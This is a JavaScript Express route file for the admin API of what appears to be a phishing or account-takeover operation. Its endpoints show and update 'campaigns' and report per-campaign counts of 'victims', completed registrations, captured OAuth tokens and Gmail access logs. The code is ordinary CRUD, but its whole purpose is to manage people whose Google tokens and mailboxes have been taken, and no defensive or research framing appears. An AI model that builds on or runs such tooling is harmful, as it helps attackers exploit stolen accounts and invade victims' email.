// Campaign detail and update routes
const express = require('express');
const router = express.Router({ mergeParams: true });
const { PrismaClient } = require('@prisma/client');

const CampaignRepository = require('../../../../repositories/campaignRepository');
const VictimRepository = require('../../../../repositories/victimRepository');
const logger = require('../../../../utils/logger');

const prisma = new PrismaClient();
const campaignRepository = new CampaignRepository(prisma);
const victimRepository = new VictimRepository(prisma);

// GET /api/admin/campaigns/:id - Campaign detail
router.get('/', async (req, res) => {
  try {
    const { id } = req.params;

    const campaign = await campaignRepository.findById(id);
    if (!campaign) {
      return res.status(404).json({ error: 'Campaign not found' });
    }

    // Get campaign statistics
    const victims = await victimRepository.findMany(
      { campaignId: id },
      { page: 1, limit: 1000 }
    );

    const statistics = {
      totalVictims: victims.total,
      totalRegistrations: victims.victims.filter(v => 
        v.validation?.registrationCompleted
      ).length,
      totalOAuthTokens: campaign.victims.reduce((sum, v) => 
        sum + (v.oauthTokens?.length || 0), 0
      ),
      totalGmailAccess: campaign.victims.reduce((sum, v) => 
        sum + (v.gmailAccessLogs?.length || 0), 0
      )
    };

    res.status(200).json({
      success: true,
      data: {
        ...campaign,
        statistics: {
          ...campaign.statistics,
          ...statistics
        }
      }
    });
  } catch (error) {
    logger.error('Error fetching campaign detail:', error);
    res.status(500).json({
      error: 'Failed to fetch campaign detail',
      message: error.message
    });
  }
});

// PUT /api/admin/campaigns/:id - Update campaign
router.put('/', async (req, res) => {
  try {
    const { id } = req.params;
    const updateData = req.body;

    // Don't allow updating id, code, or createdBy
    delete updateData.id;
    delete updateData.code;
    delete updateData.createdBy;

    // Update status history if status is being changed
    if (updateData.status) {
      const campaign = await campaignRepository.findById(id);
      if (campaign && campaign.status !== updateData.status) {
        const statusHistory = Array.isArray(campaign.statusHistory) 
          ? [...campaign.statusHistory] 
          : [];
        statusHistory.push({
          status: updateData.status,
          timestamp: new Date().toISOString(),
          changedBy: req.user?.id || null
        });
        updateData.statusHistory = statusHistory;
      }
    }

    const updatedCampaign = await campaignRepository.update(id, updateData);

    // Emit Socket.IO event
    const io = req.app.get('io');
    if (io) {
      const { emitCampaignUpdate } = require('../../../../sockets/adminHandlers');
      emitCampaignUpdate(io, 'updated', {
        campaignId: id,
        campaign: updatedCampaign
      });
    }

    res.status(200).json({
      success: true,
      data: updatedCampaign,
      message: 'Campaign updated successfully'
    });
  } catch (error) {
    logger.error('Error updating campaign:', error);
    res.status(500).json({
      error: 'Failed to update campaign',
      message: error.message
    });
  }
});

// PUT /api/admin/campaigns/:id/status - Update status
router.put('/status', async (req, res) => {
  try {
    const { id } = req.params;
    const { status } = req.body;

    if (!status) {
      return res.status(400).json({ error: 'Status is required' });
    }

    const validStatuses = ['draft', 'active', 'paused', 'suspended', 'completed', 'archived'];
    if (!validStatuses.includes(status)) {
      return res.status(400).json({ error: `Status must be one of: ${validStatuses.join(', ')}` });
    }

    const campaign = await campaignRepository.findById(id);
    if (!campaign) {
      return res.status(404).json({ error: 'Campaign not found' });
    }

    // Update status history
    const statusHistory = Array.isArray(campaign.statusHistory) 
      ? [...campaign.statusHistory] 
      : [];
    statusHistory.push({
      status,
      timestamp: new Date().toISOString(),
      changedBy: req.user?.id || null
    });

    const updatedCampaign = await campaignRepository.update(id, {
      status,
      statusHistory
    });

    // Emit Socket.IO event
    const io = req.app.get('io');
    if (io) {
      const { emitCampaignStatusChange } = require('../../../../sockets/adminHandlers');
      emitCampaignStatusChange(io, id, campaign.status, status, updatedCampaign);
    }

    res.status(200).json({
      success: true,
      data: updatedCampaign,
      message: 'Campaign status updated successfully'
    });
  } catch (error) {
    logger.error('Error updating campaign status:', error);
    res.status(500).json({
      error: 'Failed to update campaign status',
      message: error.message
    });
  }
});

module.exports = router;

